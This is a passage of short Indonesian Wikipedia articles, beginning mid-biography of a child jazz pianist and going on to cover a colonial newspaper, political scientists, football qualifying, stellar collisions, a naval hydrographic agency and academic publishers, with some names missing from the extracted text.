Alexander bermain di "A Great Night in Harlem" di , pertunjukan untuk menghormati Herbie Hancock. Penampilannya di meledak di Internet, menyedot 500.000 penonton di Facebook. Alexander juga bermain dalam konser dengan siswa dari Juilliard School, yang akhirnya memungkinkannya tinggal lebih lama di New York. Konser tersebut, yang menarik perhatian media nasional di NBC News, sukses besar sehingga Alexander berhak mendapat , yang diberikan kepada "individu dengan kemampuan luar biasa". Ia juga tampil hebat dalam konser tahun 2014 di dan International Java Jazz Festival di Jakarta.

Album perdana Alexander, "My Favorite Things", diluncurkan pada 12 Mei 2015, oleh label yang berbasis di Harlem dan diproduksi peraih Grammy Award Jason Olaine. Ia berusia 11 tahun saat peluncuran album tersebut. Alexander memulai proses rekaman pada Oktober 2014. Dia mengaransir semua lagu dalam album tersebut, di antaranya variasi "'Round Midnight", "" karya Coltrane dan karya , "". Alexander juga memasukkan komposisinya sendiri, "Ma Blues", yang terinspirasi karya , "". "My Favorite Things" menampilkan band pengiring Alexander yang beranggotakan Russell Hall (bass), Alphonso Horne (trompet) dan Sammy Miller (drum), juga bintang tamu dan . Alexander mengadakan pertunjukan penting sepanjang tahun 2015, termasuk , dan di bulan Agustus. Produser Newport, George Wein, biasanya enggan menampilkan anak berbakat, tetapi membuat pengecualian setelah Moutoussamy-Ashe mengajak Alexander ke apartemen Wein di Manhattan untuk bermain piano. Wein mengatakan Alexander tampil istimewa dengan "pendekatan harmonik yang matang". The Jazz at Lincoln Center tertarik untuk menyertakan Alexander dalam kegiatan pendidikan mereka, untuk mengajak generasi muda mendengarkan musik jazz.

Grammy Awards
Panasonic Gobel Awards
Penghargaan lainnya


</doc>
<doc id="1752172" url="https://id.wikipedia.org/wiki?curid=1752172" title="Java-bode">
Java-bode

Java-bode (dalam bahasa Indonesia berarti "Utusan Jawa") adalah surat kabar yang diterbitkan di Batavia, Hindia Belanda (kini Jakarta). Awalnya, koran ini terbit 2 kali per minggu dan sejak tanggal 1 Desember 1869 terbit setiap hari. Sejak bulan Maret 1942 hingga tahun 1949, koran ini tidak terbit karena pendudukan Jepang di Indonesia.

Pada tanggal 11 Agustus 1852, koran ini diterbitkan untuk yang pertama kalinya, dan edisi penghabisan terbit pada bulan Maret 1957. Koran ini beraliran liberal, tetapi di bawah Conrad Busken Huet koran ini beralih haluan jadi konservatif dan sejak tahun 1932 arah koran ini menjadi "kanan" sejak dipimpin oleh Henri Zentgraaff, yang karena itulah mendapat kritik tajam dari penulis Eddy du Perron.

Beberapa editor dan jurnalis telah diasosiasikan dengan Java Bode, termasuk Conrad Busken Huet(pemimpin redaksi 1868-1873), Jan Eduard van Someren Brand (penulis seri sejak 1889), Dirk Verbeek (kepala readksi pada 1915), Johan Alberts (editor sejak 1918), Herman Salomonson (kepala redaksi 1923-1926 dan penulis dari sebagian "Rhythm Chronicles" Melis Stoke), Johan Ernst Jasper (kepala redaksi 1929-1932) da Alfred van Sprang (editor 1940-1942).


Koleksi digital Java Bode dapat diakses di situs delpher.nl secara gratis. Tersedia semua edisi mulai dari edisi pertama sampai dengan edisi terakhirnya.




</doc>
<doc id="1752346" url="https://id.wikipedia.org/wiki?curid=1752346" title="Daniel Bolly Hyronimus Tifaona">
Daniel Bolly Hyronimus Tifaona

Kombes. Pol. Daniel Bolly Hyronimus Tifaona () adalah seorang perwira menengah Polri yang sejak 14 November 2016 mengemban amanat sebagai Analis Kebijakan Madya Bidang Pideksus Bareskrim Polri. Tifaona merupakan lulusan Akademi Kepolisian (Akpol) 1992. Sebelumnya, dia menjabat sebagai Kapolres Metro Jakarta Utara.



</doc>
<doc id="1752347" url="https://id.wikipedia.org/wiki?curid=1752347" title="Andi Malewa">
Andi Malewa

Andi Malewa () adalah aktivis sosial dan "socialpreneur" di bidang kuliner. Ia menjadi terkenal karena gerakan sosial Institut Musik Jalanan yang membina kreativitas pemusik jalanan agar menjadi profesional dan mampu hidup layak, serta Rumah Baca Paguyuban Terminal (Panter), yang merupakan rumah baca pertama yang berani berdiri di terminal bus, di tengah-tengah kehidupan jalanan yang menyeramkan.

Tanggal 13 Mei 2015, ia mendeklarasikan dirinya sebagai Calon Wakil Wali kota Depok, mendampingi Emil Dardak melalui jalur independen.

Andi Malewa lahir dari pasangan Drs Burhan Malewa dan Anditrisminingsih Baso, di Kota Makassar. Ia mengikuti pendidikan dasar di SD Negeri Teladan 25, di Kota Palu, Sulawesi Tengah. Ia kemudian melanjutkan ke SMP Negeri 4 Palu, lalu SMA Negeri 2 Makassar dan lulus tahun 2000. Dalam keadaan ayahnya sakit-sakitan, ia terdampar ke Jakarta, menjadi buruh pabrik, peternak itik, dan menjadi anak jalanan selama 6 tahun, sehingga ia amat memahami kerasnya kehidupan anak jalanan, dari satu pabrik ke pabrik, pasar ke pasar. Atas kebaikan hati dari H Agus Kurnia dia dibina, lalu dikuliahkan oleh seorang kerabat pada tahun 2007 ia akhirnya bisa melanjutkan hingga ke Universitas Pancasila jurusan Teknik Informatika. Kepercayaan ini berhasil ia bayar dengan mendapat predikat lulusan terbaik ke-3. Ia terus mengamen selama kuliah untuk memenuhi biaya hidup.

Setelah lulus, ia meminta izin kepada orang tua asuhnya untuk bisa memilih jalan hidup sendiri. Yang terpikir olehnya adalah membuat rumah baca dengan menyulap bekas ruangan judi dan minuman keras menjadi Rumah Baca Panter. Rumah baca ini dimulai pada tahun 2007 dan diresmikan pada 2011 Buku-buku didapatkan dari sumbangan teman-teman dan kerabat. Dengan segera Rumah Baca Panter membesar dan dikunjungi anak-anak jalanan dari Kota Depok. Pemabuk yang awalnya bertahan di sudut rumah baca, perlahan menghilang karena risi. Setelah rumah baca tersebut digusur tahun 2014, berganti menjadi Humanioract yang bergerak di bidang kemanusiaan, "edutainment", kesehatan, dan pencegahan HIV/AIDS.

Belum puas sekadar mendirikan rumah baca, Andi Malewa mendirikan Kedai Ekspresi, yang sebenarnya konsep utamanya bukanlah untuk makan minum, tetapi mengakomodasi rekaman dan pertunjukan musik anak-anak jalanan. Kedai Ekspresi ini dilengkapi studio rekaman, ratusan buku bacaan dari Rumah Baca Panter, dan panggung pertunjukan.

Institut Musik Jalanan adalah wadah yang didirikan Andi Malewa bersama teman-temannya, Iksan Skuter dan Frysto Gurning sebagai wadah musisi jalanan untuk berekspresi dan berkarya. Gerakan ini mendorong musisi jalanan untuk mau merekam karyanya menjadi CD Album. Proses seleksi dan workshop terkait cara bernyanyi, main musik, dan penampilan di depan umum dilakukan sebelum rekaman dimulai. Tujuannya bukanlah angka penjualan, tetapi juga mendobrak mekanisme industri musik yang cenderung dikuasai perusahaan-perusahaan rekaman besar.



</doc>
<doc id="1752358" url="https://id.wikipedia.org/wiki?curid=1752358" title="Graziella (film 1954)">
Graziella (film 1954)

Graziella adalah sebuah film percintaan Italia 1954 yang disutradarai oleh Giorgio Bianchi dan dibintangi oleh Maria Fiore and Jean-Pierre Mocky. Film tersebut adalah adaptasi ketiga dari novel 1852 "Graziella" karya Alphonse de Lamartine.




</doc>
<doc id="1752361" url="https://id.wikipedia.org/wiki?curid=1752361" title="Niels Mulder">
Niels Mulder

Niels Mulder adalah seorang ahli ilmu sosial dan antropolog yang banyak meneliti mengenai masyarakat Asia Tenggara, khususnya masyarakat Jawa, Muangthai, dan Filipina.

Ia merupakan lulusan Universitas Amsterdam, Belanda, kemudian mengajar di Northern Illinois University, Amerika Serikat, serta pernah pula bekerja di kantor Perserikatan Bangsa-Bangsa di Bangkok, Muangthai. Ia mulai menjadi peneliti lepas sejak tahun 1973, kemudian melakukan banyak penelitian lapangan dan menulis. Ia mendapat gelar Ph.D dari Universitas Amsterdam tahun 1975, dengan judul tesis "Kebatinan dan Hidup Sehari-hari orang Jawa" ("Mysticism and Everyday Life in Contemporary Java").

Ia bergabung dengan "Sociology of Development Research Centre" di Universitas Bielefeld, Jerman, dan memberikan kuliah musiman untuk mata pelajaran sosiologi interpretasi atas Asia Tenggara. Ia menetap sejak 2002 di daerah Gunung Banahaw di selatan Luzon, Filipina, dan melakukan penelitian analisis budaya mengenai masyarakat Filipina modern.

Beberapa karyanya antara lain:


</doc>
<doc id="1752368" url="https://id.wikipedia.org/wiki?curid=1752368" title="Kualifikasi Piala Dunia FIFA 2018 – Babak Kedua AFC">
Kualifikasi Piala Dunia FIFA 2018 – Babak Kedua AFC

Babak kedua AFC dipertandingkan untuk "Kualifikasi Piala Dunia FIFA 2018" (dan "Kualifikasi Piala Asia AFC 2019") berlangsung mulai 24 Mei 2015 hingga 29 Maret 2016.
Undian untuk putaran kedua digelar pada 14 April 2015, pukul 16.00 WIB, di Hotel JW Marriott Hotel di Kuala Lumpur, Malaysia.

Penyemaian didasarkan pada Peringkat Dunia FIFA dari April 2015 (ditunjukkan dalam kurung di bawah) 40 tim yang diunggulkan menjadi lima pot :

Setiap kelompok akan berisi tim dari masing-masing lima pot.

Sebagai urutan penyemaian didasarkan pada terbaru FIFA Peringkat sebelum undian, hal itu berbeda dari urutan di daftar peserta AFC, yang didasarkan pada Peringkat Dunia FIFA Januari 2015. Di antara enam babak pertama pemenang (yang ditunjukkan pada " miring " di bawah), tiga dari mereka diunggulkan lebih tinggi dari Pot 5 (India di Pot 3, Timor Leste dan Bhutan di Pot 4), karena poin ranking yang diperoleh dari pertandingan babak pertama.

Untuk menentukan empat peringkat kedua terbaik, kriteria berikut digunakan:
Karena Indonesia didiskualifikasi, Grup F hanya berisi empat tim, sementara grup lain berisi lima tim. Oleh karena itu, hasil melawan tim peringkat kelima tidak dihitung.
Untuk menentukan empat tim peringkat keempat terbaik, kriteria berikut digunakan:
Karena Indonesia didiskualifikasi, Grup F hanya berisi empat tim, sementara grup lain berisi lima tim. Oleh karena itu, hasil melawan tim peringkat kelima tidak dihitung.
Sebanyak 507 gol dicetak dalam 152 pertandingan, dengan rata-rata 507/152 round 2 gol per pertandingan.














</doc>
<doc id="1752372" url="https://id.wikipedia.org/wiki?curid=1752372" title="Sikandar Bagh">
Sikandar Bagh

Sikandar Bagh (, ), secara resmi dikenal oleh Britania sebagai Sikunder/Sikandra/Secundra Bagh, adalah sebuah vila dan taman yang ditutupi oleh dinding yang dijadikan benteng yang terletak di kota Lucknow, Oudh, Uttar Pradesh, India. Bangunan tersebut dibangun oleh Nawab Oudh terakhir, Wajid Ali Shah (1822–1887), sebagai tempat tinggal musim panas. Situs tersebut sekarang adalah tempat dari Institut Penelitian Botani Nasional di India.


"Indian Mutiny" by Saul David 2002 ISBN 0-14-100554-8
"My Indian Mutiny Diary" by WH Russell 1967 ISBN 0-527-78120-7



</doc>
<doc id="1752383" url="https://id.wikipedia.org/wiki?curid=1752383" title="Ekspedisi Amerika Serikat ke Korea">
Ekspedisi Amerika Serikat ke Korea

Ekspedisi Amerika Serikat ke Korea, Shinmiyangyo, atau disingkat Ekspedisi Korea, pada 1871, adalah aksi militer Amerika pertama di Korea.

Peristiwa tersebut umumnya terjadi di atas atau di sekitar pulau Korea Ganghwa.

Ekspedisi tersebut diikuti oleh sekitar 650 pria, lebih dari 500 pelaut dan 100 Marinir, serta lima kapal perang: , , , , dan .





</doc>
<doc id="1752388" url="https://id.wikipedia.org/wiki?curid=1752388" title="Tōkaidō (jalan)">
Tōkaidō (jalan)



</doc>
<doc id="1752407" url="https://id.wikipedia.org/wiki?curid=1752407" title="Tabrakan bintang">
Tabrakan bintang

Sebuah tabrakan bintang adalah bertabrakannya dua bintang yang dengan gaya gravitasi bersatu untuk membentuk benda yang lebih besar. Para astronom memprediksikan bahwa tabrakan ini terjadi di gugus bola di Bima Sakti sekitar sekali setiap 10.000 tahun. Kejadian tabrakan ini baru mampu diobservasi oleh para ilmuwan dalam beberapa tahun terakhir.

Bintang mana saja di alam semesta—bintang katai putih, bintang neutron, lubang hitam, bintang deret utama, dan bintang raksasa—dapat bertabrakan dengan bintang lain entah bintang itu hidup (fusi masih terjadi pada bintang) atau mati (tidak terjadi lagi fusi pada bintang). Perbedaan pada jenis bintang, massa, suhu, dan jari-jari bintang akan menghasilkan tabrakan atau penggabungan yang berbeda pula.

Bintang katai putih merupakan sisa-sisa dari bintang bermassa rendah dan jika mereka membentuk tata bintang biner dengan bintang lain, ledakan bintang yang besar yang disebut supernova tipe Ia dapat terjadi. Salah satu proses yang dapat menyebabkan kejadian ini yaitu jika sebuah bintang katai putih menarik material-material dari sebuah bintang deret utama atau raksasa merah untuk membentuk piringan akresi. Akan tetapi, jika dua bintang katai putih mengorbit satu sama lain dalam jarak dekat, maka emisi gelombang gravitasi menyebabkan kedua bintang berputar ke arah dalam. Ketika keduanya bersatu, jika massa gabungannya mendekati atau melebihi batas Chandrasekhar, fusi karbon akan terjadi dan menaikkan suhu. Karena sebuah bintang katai putih teridiri atas , tidak ada titik keseimbangan pasti antara tekanan suhu dan berat gabungan dari bintang. Karena itu, rekasi fusi dengan cepat memanaskan bagian dalam dali bintang yang tergabung dan menyebarkannya menghasilkan sebuah ledakan supernova. Dalam jangka waktu beberapa detik, seluruh massa bintang katai putih terlontar ke ruang angkasa.

Tabrakan bintang neutron terjadi dengan karakteristik yang serupa dengan supernova tipe 1a. Ketika dua bintang neutro mengorbit satu sama lain dalam jarak yang berdekatan, keduanya berputar ke arah dalam seiring waktu. Ketika kedua bintang bertemu, tabrakan terjadi dan menghasilkan sebuah lubang hitam (dengan asumsi bahwa massa gabungan yang terbentuk melebihi batas Tolman–Oppenheimer–Volkoff). Sebuah medan magnetik terentuk yang triliunan kali lebih kuat daripada medan magnetik Bumi dalam waktu satu atau dua milidetik. Astronom mengasumsikan bahwa kejadian inilah yang menyebabkan beberapa pancaran gelombang gamma.

Dua bintang bermassa rendah pada sebuah tata bintang biner yang bergabung dan membuat sebuahpiringan ekskresi dapat membentuk planet baru.

Walaupun teori tabrakan bintang telah ada selama beberapa generasi astronom, perkembangan tekonologilah yang mampu membuat teori tersebut dapat terbukti. Pada tahun 1764, sebuah gugus bintang yaitu Messier 30 ditemukan oleh astronom Charles Messier. Pada abad ke-20, astronom menyimpulkan bahwa gugus tersebut kira-kira berusia 13 miliar tahun.Teleskop Angkasa Hubble mampu menyorot satu per satu bintang di Messier 30. Dengan teknologi baru ini, astronom menemukan bahwa beberapa bintang yang disebut bintang tampak berusia lebih muda daripada bintang lainnya di dalam gugusnya. Hipotesis yang ada kemudian adalah bahwa bintang-bintang telah bertabrakan atau bergabung sehingga memberikan tenaga lebih bagi mereka untuk dapat melanjutkan fusinya sementara bintang-bintang lainnya di sekitar mereka meredup.

Walaupun tabrakan bintang sangat mungkin untuk terjadi di beberapa bagian Bima Sakti, kemungkinan sebuah tabrakan yang melibatkan Matahari adalah kecil. Peluang yang dihitung memprediksikan tingkat tabrakan bintang yang melibatkan Matahari bernilai 1 dalam 10 tahun.
Untuk perbandingan, usia alam semesta ada pada kisaran 10 tahun. Kemungkinan mendekatnya sebuah bintang ke Matahari sangat kecil. Tingkat tersebut diperkirakan sebagai berikut:
dengan "N" adalah jumlah bintang yang mendekat per juta tahun yang memiliki jari-jari "D" Matahari dalam parsec. Untuk perbandingan, jari-jari rata-rata orbit Bumi terhadap Matahari adalah 1 AU atau .

Walaupun Matahari memiliki kemungkinan kecil agar dapat terpengaruh dari kejadian tabrakan, Bumi dapat dengan mudah terpengaruh. Astronom menyebutkan bahwa jika sebuah tabrakan bintang terjadi dalam jarak 100 tahun cahaya dari Bumi, kehancuran Bumi dapat terjadi. Hal ini bagaimanapun juga berpeluang kecil karena tidak ada gugus bintang yang berada sedekat itu dari Tata Surya.


</doc>
<doc id="1752411" url="https://id.wikipedia.org/wiki?curid=1752411" title="Kenneth W. Thompson">
Kenneth W. Thompson

Kenneth W. Thompson (29 Agustus 1921 – 2 Februari 2013) adalah akademik dan penulis Amerika Serikat yang dikenal atas kontribusinya bagi teori normatif dalam hubungan internasional. Pada tahun 1978, ia menjabat sebagai direktur Miller Center of Public Affairs di Universitas Virginia. Ia pensiun pada tahun 1998, tetapi masih menjadi ketua program forumnya sampai tahun 2004.

Thompson mendapat gelar Ph.D. dari Universitas Chicago tahun 1950. Ia mengajar di sana dan Universitas Northwestern pada tahun 1949 sampai 1955. Ia kembali mengajar di Universitas Virginia tahun 1975. Antara 1955 dan 1975, ia bekerja di bidang filantropi kelembagaan dan menjadi Wakil Presiden Program Internasional Rockefeller Foundation.

Ia membantu menyusun delapan komisi nasional yang mengurus berbagai bidang, mulai dari ketidakmampuan presiden sampai pemilihan hakim federal.

"Principles and Problems of International Politics" karya Thompson, sebuah volume bacaan yang disunting bersama mentornya, Hans Morgenthau, menjadi panduan intelektual pemikirannya selama empat dasawarsa. Salah satu fitur utama dalam buku panduan ini adalah ketergantungannya pada sejarah. Thompson memandang dirinya sebagai bagian dari tradisi realisme politik yang berpengaruh, pewaris pemikiran Morgenthau dan Reinhold Niebuhr, dan pengurus generasi ilmuwan selanjutnya. Ia menyusun dan menyunting "Politics among Nations" edisi ketujuh yang diterbitkan oleh McGraw Hill.

Keinginan Thompson untuk meletakkan pemikiran hubungan internasional dalam sejarah justru mendorongnya untuk enggan memercayai teori-teori monokausal (sebab tunggal), baik itu pengutamaan kelas dan hubungan ekonominya Marxis, kepercayaan kaum liberal terhadap pemerintahan demokratis, atau perumusan "ilmiah" hampir semua pemikiran hubungan internasional sejak revolusi behaviorisme. Bagi Thompson, teori melihat hal-hal yang paling mendasar dari kenyataan, tetapi teori yang melenceng jauh dari rumitnya kenyataan sejarah bisa jadi cerminan dari prasangka si teoriwan itu sendiri, bukan cara yang bermanfaat untuk memahami sistem internasional.

Ketidakpercayaannya akan para penyederhana utama ini membuatnya enggan bergantung pada satu kebenaran dan mengakui pemikiran Niebuhr bahwa semua pandangan politik bersifat parsial, motif selalu tidak jelas, dan kebenaran apapun akan berbahaya bila dilihat dari pangkal logikanya. Tidak seperti peneliti teori normatif dalam hubungan internasional, Thompson tidak mau mencap satu sisi dalam sengketa sebagai pihak yang benar dan satu sisi lainnya salah. Ia berpendapat bahwa kedua pihak mungkin memiliki klaim sah yang dapat ditekan lebih jauh apabila tidak ditentang. Keyakinan ini membuat Thompson menegaskan bahwa hasil akhir politik internasional yang dapat dibenarkan secara etis dapat dicapai dengan ikut menyeimbangkan kekuatan alih-alih mendesak secara moral.

Menurut Thompson, penyebaran kekuasaan yang mencegah satu pelaku mendominasi semua pelaku adalah inti dari "The Federalist" Papers, pemikiran yang masih berlaku dalam hubungan internasional meski teknologi, ideologi, dan ikatan ekonomi terus berubah. Ia pun seumur hidupnya berusaha menyatukan aliran realis yang menganggap dunia selalu penuh kekhawatiran dengan aliran moralis yang mengutamakan kehati-hatian.

Penegasan Thompson pada kebenaran yang diadopsi aliran realis dari filsafat politik, sejarah internasional, dan teologi Kristen telah dipertanyakan oleh kaum behavioris dan neorealis. Mereka memandang kebenaran itu "lembut", sedangkan kaum moralis memandang kebenaran itu "sinis". Namun demikian, kerja keras Thompson membuat realisme klasik bertahan dan mengalami kebangkitan pada abad ke-20 dan 21.





</doc>
<doc id="1752422" url="https://id.wikipedia.org/wiki?curid=1752422" title="Pusat Hidro-Oseanografi TNI Angkatan Laut">
Pusat Hidro-Oseanografi TNI Angkatan Laut

Pusat Hidrografi dan Oseanografi TNI Angkatan Laut (Pushidrosal) adalah Kotama Pembinaan TNI Angkatan Laut yang berkedudukan langsung di bawah Kepala Staf Angkatan Laut (Kasal). Sebelumnya satuan ini bernama Dinas Hidro-Oseanografi TNI Angkatan Laut (Dishidrosal). Pushidrosal mempunyai tugas pokok menyelenggarakan pembinaan fungsi dan pelaksanaan kegiatan Hidro-Oseanografi (Hidros) yang meliputi survei, penelitian, pemetaan laut, publikasi, penerapan lingkungan laut dan keselamatan navigasi pelayaran baik untuk kepentingan TNI maupun umum, dan menyiapkan data serta informasi wilayah pertahanan di laut dalam rangka mendukung tugas pokok TNI Angkatan Laut.

Mako Pushidrosal berada di Jalan Pantai Kuta V/1 Ancol Timur, Jakarta Utara.

Pushidrosal sesuai dengan tugasnya berkewajiban menyiapkan dan menyediakan data dan informasi Hidro-oseanografi untuk kepentingan TNI maupun umum. Untuk kepentingan keselamatan Navigasi pelayaran, Pushidrosal mempunyai kewenangan dan legalitas tunggal di bidang Hidrografi dalam menyiapkan dan menyediakan data dan informasi Hidro-oseanografi berupa Peta Laut (peta kertas maupun peta navigasi elektronik) dan publikasi nautika. Pada awalnya Pushidrosal ditetapkan sebagai Lembaga Hidrografi Nasional berdasarkan Peraturan Pemerintah Republik Indonesia Nomor 23 Tahun 1951 tanggal 31 Maret 1951 (PP RI No. 23/1951) dan Keputusan Presiden Republik Indonesia Nomor 164 Tahun 1960 tanggal 14 Juli 1960 (Keppres RI No. 164/1960), mengemban fungsi sebagai Lembaga Hidrografi Militer dan Lembaga Hidrografi Nasional Indonesia.
Pushidrosal sebagai Lembaga Hidrografi Militer, bertanggung jawab untuk mampu menyediakan data dan informasi Hidro-oseanografi yang akurat dan mutakhir sebagai data dasar yang akan digunakan sebagai bahan analisis strategi pertahanan nasional. Sedangkan sebagai Lembaga Hidrografi Nasional Indonesia, Pushidrosal mempunyai tanggung jawab untuk memberikan jaminan keselamatan Navigasi pelayaran di seluruh wilayah perairan yurisdiksi Negara Kesatuan Republik Indonesia. Sebagai Lembaga Hidrografi Nasional, Pushidrosal merupakan representasi legal dan wakil pemerintah RI dalam keanggotaan resmi organisasi internasional, yaitu International Hydrographic Organization (IHO) yang berkedudukan di Monaco dan Komisi Hidrografi Asia Timur atau East Asia Hydrographic Commission (EAHC). Selain itu, Pushidrosal juga menjadi anggota delegasi pemerintah RI di beberapa organisasi internasional di bidang Hidrografi, Oseanografi dan Navigasi pelayaran seperti International Maritime Organization (IMO), Inter-Government Oceanographic Commision (IOC), United Nations Conference on Standardization of Geographical Names (UNCSGN) dan United Nations Group of Experts on Geographical Names (UNGEGN).

Peresmian Pushidrosal merupakan realisasi dari validasi organisasi TNI Angkatan Laut yang telah disetujui presiden berdasarkan Perpres Nomor 62 Tahun 2016 tentang perubahan atas Perpres Nomor 10 Tahun 2010 tentang Susunan Organisasi Tentara Nasional Indonesia. Dalam amanatnya Kasal mengatakan Pushidrosal memiliki peran sentral dalam menyelenggarakan pembinaan hidro-oseanografi yang meliputi survei, penelitian, pemetaan laut, publikasi, penerapan lingkungan laut, keselamatan navigasi pelayaran baik untuk kepentingan TNI maupun umum, serta menyiapkan data dan informasi wilayah pertahanan di laut.

Hingga saat ini, Pushidrosal terus melaksanakan tugas pokoknya mengadakan survei dan pemetaan untuk mengumpulkan data dan informasi Hidro-oseanografi dalam rangka pembuatan produk Peta Laut dan publikasi. Dalam melaksanakan kegiatannya, Pushidrosal diperkuat sebanyak delapan kapal survei dan pemetaan hidro-oseanografi, yaitu:

Disamping itu, Pushidrosal juga memiliki delapan unit survei pesisir.



</doc>
<doc id="1752427" url="https://id.wikipedia.org/wiki?curid=1752427" title="Martin Wight">
Martin Wight

Robert James Martin Wight (26 November 1913 – 15 Juli 1972), juga dikenal dengan nama Martin Wight, adalah salah satu ilmuwan hubungan internasional Britania Raya ternama pada abad ke-20. Ia merupakan penulis "Power Politics" (1946; direvisi dan diperluas tahun 1978) dan esai ""Why is there no International Theory?"" (pertama terbit di jurnal "International Relations" tahun 1960 dan diterbitkan lagi di "Diplomatic Investigations" tahun 1966). Ia pernah mengajar di London School of Economics dan Universitas Sussex dan menjabat sebagai Dekan Studi Eropa.

Wight sering dikaitkan dengan kelompok teori politik internasional Britania (berbeda dengan kelompok Amerika Serikat) dan hubungan internasional mazhab Inggris. Selain John Anderson, karya-karya Wight juga sangat memengaruhi pemikiran Hedley Bull, penulis salah satu buku terlaris di bidang politik internasional, "The Anarchical Society" (1977).

Wight menulis banyak tinjauan, kebanyakan di antaranya untuk "The Observer" dan "International Affairs". Karya-karya utamanya adalah:





</doc>
<doc id="1752428" url="https://id.wikipedia.org/wiki?curid=1752428" title="Nicholas J. Spykman">
Nicholas J. Spykman

Nicholas John Spykman (1893–1943) adalah geostrategiwan Belanda-Amerika yang dikenal sebagai "bapak pembendungan." Sebagai ilmuwan politik, ia merupakan salah satu pendiri aliran realis klasik dalam kebijakan luar negeri Amerika Serikat dengan memboyong pemikiran politik Eropa Timur ke Amerika Serikat. Ia pernah menjabat sebagai Dosen Sterling Hubungan Internasional di Institute for International Studies, Universitas Yale. Ia ingin mahasiswanya melek geografi karena geopolitik mustahil diajarkan tanpa pemahaman geografi. Ia menikah dengan novelis anak E. C. Spykman dan meninggal dunia akibat kanker pada usia 49 tahun.

Spykman telah menerbitkan dua buku mengenai kebijakan luar negeri. "America's Strategy in World Politics" diterbitkan tahun 1942 menjelang masuknya Amerika Serikat ke kancah Perang Dunia II. Khawatir akan keseimbangan kekuasaan, ia berpendapat bahwa isolasionisme yang bergantung pada lautan untuk melindungi Amerika Serikat akan gagal. Tujuannya adalah mencegah mundurnya Amerika Serikat, sama seperti kebijakan pasca-Perang Dunia I. "The Geography of the Peace" diterbitkan satu tahun setelah Spykman meninggal. Dalam buku tersebut, ia memaparkan geostrateginya dan berpendapat bahwa keseimbangan kekuasaan di Eurasia memengaruhi keamanan Amerika Serikat secara langsung.

Dalam tulisannya, Spykman cenderung mengarah ke determinisme lingkungan. Karena geografi merupakan "faktor yang paling menentukan karena sifatnya permanen," geografi harus diutamakan dalam analisis kebijakan luar negeri suatu negara.





</doc>
<doc id="1752429" url="https://id.wikipedia.org/wiki?curid=1752429" title="Herman Kahn">
Herman Kahn

Herman Kahn (15 Februari 1922 – 7 Juli 1983) adalah pendiri Hudson Institute dan salah satu futuris ternama pada akhir abad ke-20. Ia awalnya dikenal sebagai strategiwan militer dan teoriwan sistem saat masih bekerja di RAND Corporation. Ia kemudian dikenal karena menganalisis potensi dampak perang nuklir dan menyarankan berbagai cara untuk meningkatkan kemungkinan selamat. Berkat analisis tersebut, Kahn menjadi satu dari tiga inspirasi bagi tokoh utama film satir komedi hitam "Dr. Strangelove" besutan Stanley Kubrick.

Teori-teorinya sangat memengaruhi perkembangan strategi nuklir Amerika Serikat.

Di luar bidang fisika dan statistika, karya-karya Kahn meliputi:

Karya terbitan RAND Corporation yang melibatkan Kahn:





</doc>
<doc id="1752431" url="https://id.wikipedia.org/wiki?curid=1752431" title="John Lewis Gaddis">
John Lewis Gaddis

John Lewis Gaddis (lahir 1941 di Cotulla, Texas) adalah sejarawan Perang Dingin dan strategi besar Amerika Serikat yang dijuluki "Dekan Sejarawan Perang Dingin" oleh "The New York Times". Ia merupakan Dosen Militer dan Sejarah Angkatan Laut Robert A. Lovett di Universitas Yale. Ia juga merupakan negarawan Amerika Serikat ternama abad ke-20 George F. Kennan. Biografi tersebut memenangi Pulitzer Prize for Biography pada tahun 2012.







</doc>
<doc id="1752436" url="https://id.wikipedia.org/wiki?curid=1752436" title="Donald Adamson">
Donald Adamson

Donald Adamson () adalah seorang penulis dan sejarawan dari Inggris, yang buku-bukumya termasuk biografi dari Pascal.




</doc>
<doc id="1752439" url="https://id.wikipedia.org/wiki?curid=1752439" title="Columbia University Press">
Columbia University Press

Columbia University Press adalah pers universitas yang berpusat di New York City dan berafiliasi dengan Universitas Columbia. Perusahaan ini sekarang dipimpin oleh Jennifer Crewe (2014–sekarang) dan menerbitkan buku-buku bertopik humaniora dan sains, khususnya bidang studi sastra dan budaya, sejarah, kerja sosial, sosiologi, agama, film, dan studi internasional.

Columbia University Press didirikan tahun 1893. Perusahaan ini dikenal sebagai penerbit tulisan-tulisan referensi seperti "The Columbia Encyclopedia" (1935–sekarang), "The Columbia Granger's Index to Poetry" (judul daringnya "The Columbia World of Poetry Online"), dan "The Columbia Gazetteer of the World" (juga daring) dan karya musik.

Sebagai salah satu pers universitas pertama di Amerika Serikat yang memiliki format elektronik, Columbia University Press meluncurkan dua situs khusus terbitan daring, "Columbia International Affairs Online" (CIAO; 2008) dan "Columbia Earthscape" (2009).

Pada tahun 2011, Columbia University Press mengakuisisi penerbit asal Britania Raya, Wallflower Press.



</doc>
<doc id="1752445" url="https://id.wikipedia.org/wiki?curid=1752445" title="Penguin Group">
Penguin Group

Penguin Group adalah penerbit buku yang menjadi bagian dari Penguin Random House. Grup ini dimiliki oleh Pearson PLC, perusahaan pendidikan dan penerbitan global, dan Bertelsmann, konglomerat media Jerman. Perusahaan baru ini dibentuk melalui merger yang diselesaikan tanggal 1 Juli 2013. Bertelsmann menguasai 53% saham usaha patungan ini, dan Pearson menguasai 47% saham sisanya.

Penguin Books berkantor pusat di City of Westminster, London.

Divisinya di Britania Raya bernama "Penguin Books Ltd." Divisi lainnya tersebar di Amerika Serikat, Irlandia, Selandia Baru, India, Australia, Kanada, Cina, dan Afrika Selatan.

Imprin milik Penguin Group adalah:



</doc>
<doc id="1752450" url="https://id.wikipedia.org/wiki?curid=1752450" title="Cambridge University Press">
Cambridge University Press

Cambridge University Press (CUP) adalah perusahaan penerbit milik Universitas Cambridge. Perusahaan ini didirikan melalui paten surat Raja Henry VIII pada tahun 1534. CUP merupakan perusahaan penerbit tertua di dunia dan pers universitas terbesar kedua di dunia (setelah Oxford University Press).

Misi pers ini adalah "melanjutkan misi universitas untuk membebaskan pengetahuan demi meraih pendidikan, pembelajaran, dan penelitian terbaik secara internasional."

Cambridge University Press adalah departemen Universitas Cambridge dan merupakan penerbit akademik sekaligus penerbit pendidikan. Dengan sirkulasi global, anak penerbit, dan kantor di lebih dari 40 negara, CUP telah menerbitkan lebih dari 50.000 judul buku karya penulis dari +100 negara. Terbitan CUP mencakup jurnal akademik, karya referensi, buku teks, dan publikasi pengajaran dan pendidikan bahasa Inggris. Cambridge University Press merupakan badan amal yang menyerahkan kembali laba tahunannya ke pihak universitas.

